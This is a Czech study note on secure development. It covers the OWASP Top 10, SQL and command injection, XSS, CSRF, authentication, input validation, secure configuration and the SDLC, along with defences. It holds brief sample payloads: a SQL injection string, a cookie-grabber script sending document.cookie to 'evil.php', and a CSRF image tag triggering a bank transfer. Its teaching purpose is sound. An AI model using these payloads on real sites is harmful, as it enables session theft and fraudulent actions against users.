# 18 - Principy bezpečného vývoje

1. [18 - Principy bezpečného vývoje](#18---principy-bezpečného-vývoje)
   1. [Základy bezpečného vývoje](#základy-bezpečného-vývoje)
   2. [Proč je bezpečnost důležitá](#proč-je-bezpečnost-důležitá)
      1. [Hlavní principy bezpečného vývoje](#hlavní-principy-bezpečného-vývoje)
      2. [OWASP Top 10 (2025 edition)](#owasp-top-10-2025-edition)

2. [Injection útoky](#injection-útoky)
   1. [SQL injection](#sql-injection)
      1. [Princip](#princip)
      2. [Ochrana](#ochrana)
      3. [Typy](#typy)
   2. [Commandline Injection](#commandline-injection)

3. [XSS - Cross-Site Scripting](#xss---cross-site-scripting)
   1. [Reflected XSS](#reflected-xss)
   2. [Stored XSS](#stored-xss)
   3. [DOM-based XSS](#dom-based-xss)
   4. [Dopady XSS](#dopady-xss)
   5. [Ochrana](#ochrana)

4. [CSRF - Cross-Site Request Forgery](#csrf---cross-site-request-forgery)
   1. [Ochrana proti CSRF](#ochrana-proti-csrf)

5. [Autentizace a autorizace](#autentizace-a-autorizace)
   1. [Bezpečná autentizace](#bezpečná-autentizace)
      1. [Bezpečné ukládání hesel](#bezpečné-ukládání-hesel)
      2. [MFA - Multi-Factor Authentication](#mfa---multi-factor-authentication)
      3. [Ochrana proti brute-force útokům](#ochrana-proti-brute-force-útokům)
   2. [Session management](#session-management)
   3. [Autorizace](#autorizace)
      1. [RBAC - Role-Based Access Control](#rbac---role-based-access-control)
      2. [Ověření oprávnění na serveru](#ověření-oprávnění-na-serveru)
      3. [Broken Access Control](#broken-access-control)

6. [Validace vstupů](#validace-vstupů)
   1. [Principy validace](#principy-validace)
   2. [Typy validace](#typy-validace)
   3. [Sanitizace](#sanitizace)

7. [Bezpečná konfigurace](#bezpečná-konfigurace)
   1. [Správa citlivých údajů](#správa-citlivých-údajů)
      1. [Environment variables](#environment-variables)
      2. [Secret management](#secret-management)
      3. [`.gitignore` pro citlivé soubory](#gitignore-pro-citlivé-soubory)
   2. [Error handling](#error-handling)
      1. [Nezobrazovat detailní chybové zprávy uživatelům](#nezobrazovat-detailní-chybové-zprávy-uživatelům)
      2. [Logování chyb na serveru](#logování-chyb-na-serveru)
   3. [Security headers](#security-headers)

8. [Bezpečný vývojový cyklus (SDLC)](#bezpečný-vývojový-cyklus-sdlc)
   1. [Security v jednotlivých fázích](#security-v-jednotlivých-fázích)


## Základy bezpečného vývoje
## Proč je bezpečnost důležitá

**Dopady incidentů**: Únik dat, finanční ztráty, právní problémy  
**Náklady**: **Oprava** po útoku je **výrazně dražší** než prevence během vývoje  
**Reputace**: **Ztráta důvěry** uživatelů může být dlouhodobá nebo nevratná

### Hlavní principy bezpečného vývoje
**Security by Design**: Bezpečnost řešíš už při návrhu systému, ne až jako „doplněk“ na konci  
**Defense in Depth**: Více vrstev ochrany – když selže jedna, další stále chrání systém  
**Principle of Least Privilege**: Každý uživatel i komponenta má jen ta oprávnění, která nutně potřebuje  
**Fail Secure**: Když systém selže, měl by zůstat v bezpečném stavu

### OWASP Top 10 ([2025 edition](https://owasp.org/Top10/2025/))

**Seznam nejčastějších webových zranitelností**
- Používá se jako standard pro bezpečnostní audit
- Pomáhá pochopit:
  - Kde jsou největší rizika
  - Jaké útoky jsou nejčastější
  - Jak se proti nim bránit

---

# Injection útoky

## [SQL injection](./08%20-%20databáze.md#sql-injection)

### Princip
Útočník **vloží SQL kód do query** a **změní tím chování** databázového dotazu
- Co může udělat
  - Obejít přihlášení
  - Získat nebo upravit data
  - Smazat databázi

1. Útočník vloží SQL kód do vstupu:
    - ```sql
      SELECT * FROM users WHERE name = '<input>';
      ```
2. Útočník vloží: `Franta' OR 1=1 OR name = 'Pepa`
3. Query pak vypadá:
    - ```sql
      SELECT * FROM users WHERE name = 'Franta' OR 1=1 OR name = 'Pepa'`
      ```
    - Výsledek: Přečte celou databázi

### Ochrana

#### **Prepared statements**

Dovoluje "předkompilovat" query pro oddělení dat a samotného query
- ```sql
  SELECT * FROM users WHERE name = ?;
  ```
  - `?` je placeholder pro data

#### **Validace vstupů**

Kontrola délky  
**Povolené znaky**: Zakáže např. `;`, `=`, ... pro zabránění SQL injekcí  
**Typ dat** (číslo vs text)

### Typy
**Classic**: Přímo vidíš výsledek  
**Blind**: Odpověď neobsahuje data, ale dá se odvodit  
**Time-based**: Reakce serveru podle času

## Commandline Injection

Útočník **vloží systémový příkaz** (např. do shellu), který se následně **vykoná na serveru**

**Rizika**
- Spuštění škodlivých příkazů
- Přístup k systému
- Kompromitace serveru


**Ochrana**
- Ideálně vůbec **nespouštět** shell příkazy
- Používat **whitelist vstupů**
- Escapovat speciální znaky
- Používat bezpečné API místo shellu

---


# XSS - **C**ross-**S**ite **S**cripting

Útočník dostane **škodlivý JavaScript do stránky**, kterou si **zobrazí jiný uživatel**
- Aplikace **věří vstupu** a vrátí ho **bez úpravy zpět do HTML**


## Reflected XSS
- Skript je součástí URL nebo requestu
- Server ho „odrazí“ zpět v odpovědi

Cookie grabber:
```html
<script type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</script>
```

## Stored XSS
Škodlivý kód je **uložen na serveru** (např. komentář)
- Spustí se každému, kdo stránku navštíví

## DOM-based XSS
Chyba je čistě na straně klienta (JavaScript)
- Manipulace s DOM bez validace

## Dopady XSS
Krádež session cookies  
Převzetí účtu  
Přesměrování uživatele  
Úprava obsahu stránky (defacement)  
Keylogging


## Ochrana
**Output encoding**: Escapování znaků podle kontextu (HTML, JS, URL)  
**Content Security Policy** (CSP): Omezuje, odkud lze načítat skripty
- Výrazně snižuje dopad XSS

**HttpOnly cookies**: JavaScript nemůže číst cookies -> ochrana session  
**Validace a sanitizace vstupů**: Whitelist přístup
- Odstraňování nebezpečných tagů

---

# CSRF - **C**ross-**S**ite **R**equest **F**orgery
[OWASP](https://owasp.org/www-community/attacks/csrf#)

**Provedení akce jménem přihlášeného uživatele**
- Zneužití důvěry serveru v uživatele
- Útoky přes odkazy, obrázky, formuláře


**Typický scénář**
1. Uživatel je přihlášený (má session cookie)
2. Navštíví škodlivou stránku
3. Ta odešle request na cílový server
4. Server to bere jako legitimní akci

**Příklad**
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
- Prohlížeč automaticky přiloží cookies -> převod proběhne

## Ochrana proti CSRF
**CSRF tokeny**: Unikátní token v každém formuláři
- server kontroluje jeho platnost

**SameSite cookies**: Omezuje posílání cookies mezi weby
- `SameSite=Strict` nebo `Lax`

**Kontrola Referer / Origin**: Ověření, odkud request přišel  
**Re-autentizace**: Např. zadání hesla u citlivých operací

---

# Autentizace a autorizace

## Bezpečná autentizace

### Bezpečné ukládání hesel
**Hashovací funkce jako `bcrypt` a `argon2`**
- **Jsou pomalé** -> ztěžují útoky
- Obsahují ochranu proti moderním metodám prolomení
- I stejná hesla mají jiné hashe

**Používat salty**: Přídání random hodnoty do hesla před zahashovaním

### MFA - **M**ulti-**F**actor **A**uthentication
**Ověření pomocí více faktorů**
- Něco **co znáš** (heslo)
- Něco **co máš** (telefon)
- Něco **co jsi** (biometrie)

### Ochrana proti brute-force útokům

- Omezení počtu pokusů o přihlášení
- CAPTCHA
- Dočasné blokování účtu
- Zpomalování odpovědí serveru

## Session management

**Session** = Stav přihlášení uživatele

**Bezpečné generování session ID**: Musí být náhodné a dostatečně dlouhé
- Nesmí jít uhodnout

**Session timeout**: Automatické odhlášení po neaktivitě  
**Invalidace session při odhlášení**: Session musí být po logoutu zneplatněna  
**Ochrana session cookies**
- `HttpOnly`: Nepřístupné JavaScriptu
- `Secure`: Pouze přes HTTPS
- `SameSite`: Ochrana proti [CSRF](#csrf---cross-site-request-forgery)

## Autorizace
**Autorizace** = Co uživatel smí dělat

### RBAC - **R**ole-**B**ased **A**ccess **C**ontrol
- Uživatel má roli (např. admin, user)
- Role určuje oprávnění

### Ověření oprávnění na serveru
**Kriticky důležité**
- Klientovi (frontend) se nedá věřit
  - Server musí vždy kontrolovat oprávnění

### Broken Access Control
Jedna z nejčastějších zranitelností
- Uživatel se dostane k cizím datům
- Např. změnou ID v URL


---

# Validace vstupů
## Principy validace
**Nikdy nedůvěřovat uživatelskému vstupu**
- Může být škodlivý nebo upravený útočníkem

**Validace na straně serveru** - Povinost
**hlavní ochrana**, nelze obejít

**Validace na straně klienta** - Doplněk
- Zlepšuje UX (**U**ser e**X**perience)
- Lze obejít -> není bezpečnostní opatření

**Whitelist vs blacklist**
- **Whitelist** (doporučeno): Povolit jen správné hodnoty
- **Blacklist**: Zakazuje známé špatné - Méně bezpečné

## Typy validace
**Podle datového typu**: Číslo, text, boolean  
**Podle Délky**: Minimální a maximální délka  
**Formát** (regex): Např. email, telefon  
**Rozsah hodnot**: Např. věk 0–120

## Sanitizace
**Odstranění nebezpečných znaků**: Např. `<script>`, `'`, `"`

**HTML entity encoding**: Převod znaků
- `<` -> `&lt;`
- `>` -> `&gt;`
- Ochrana proti [XSS](#xss---cross-site-scripting)

**URL encoding**: Speciální znaky se převedou na `%` + jejich hodnota v HEXu
- Např. mezera -> `%20`

---

# Bezpečná konfigurace

## Správa citlivých údajů

**Nikdy necommitovat credentials do repozitáře**

### Environment variables
Citlivá data se **neukládají přímo v kódu**
- Místo toho se **ukládají do proměnných prostředí**
- Nejsou viditelné v repozitáři

### Secret management

Speciální nástroje pro správu tajných údajů:
- `HashiCorp Vault`
- `AWS Secrets Manager`

**Umožňují**: Bezpečné ukládání secrets
- Řízení přístupu
- Rotaci klíčů

### `.gitignore` pro citlivé soubory
**Zabrání nahrání** citlivých souborů do repozitáře
- Např: `.env` nebo konfigurační soubory

## Error handling
### Nezobrazovat detailní chybové zprávy uživatelům

Útočník získá informace o systému
- **NE**zobrazovat:
  - `SQL` dotazy
  - `stack trace`
  - Informace o serveru

### Logování chyb na serveru
Detailní **chyby se ukládají do logů**
- Slouží pro diagnostiku a/nebo analýzu útoků

## Security headers

**HTTP hlavičky zvyšující bezpečnost** webu

**CSP** (**C**ontent-**S**ecurity-**P**olicy): Omezuje, odkud se mohou načítat skripty
- Ochrana proti [XSS](#xss---cross-site-scripting)

**X-Content-Type-Options**: Zabraňuje prohlížeči hádat typ souboru
- Ochrana proti [MIME sniffing](https://www.compassitc.com/blog/mime-sniffing-what-is-it-what-are-the-security-implications)

**X-Frame-Options**: Zakazuje vložení stránky do [`iframe`](https://www.w3schools.com/html/html_iframe.asp)
- `iframe` zobrazuje stránku uvnitř stránky
- Ochrana proti clickjacking

**HSTS** (**S**trict-**T**ransport-**S**ecurity): Vynucuje HTTPS komunikaci
- Ochrana proti MITM útokům

---

# Bezpečný vývojový cyklus (SDLC)
**SDLC** = **S**oftware **D**evelopment **L**ife **C**ycle

## Security v jednotlivých fázích
1. **Plánování**
    - Threat modeling: Hledání možných hrozeb
    - Definice bezpečnostních požadavků
2. **Vývoj**: Dodržování pravidel bezpečného kódování
    - Code review (kontrola kódu ostatními vývojáři)
3. **Testování**: Security testing - hledání zranitelností
    - Penetration testing - simulace útoku
4. **Nasazení**
    - Hardening: Zabezpečení systému
      - Vypnutí nepotřebných služeb
      - Minimální oprávnění
    - Monitoring: Sledování podezřelých aktivit
5. **Údržba**: Patch management - Aktualizace softwaru
    - [Incident response](./10%20-%20incident%20response%20a%20krizové%20řízení.md#úvod-do-incident-response): Reakce na bezpečnostní incidenty
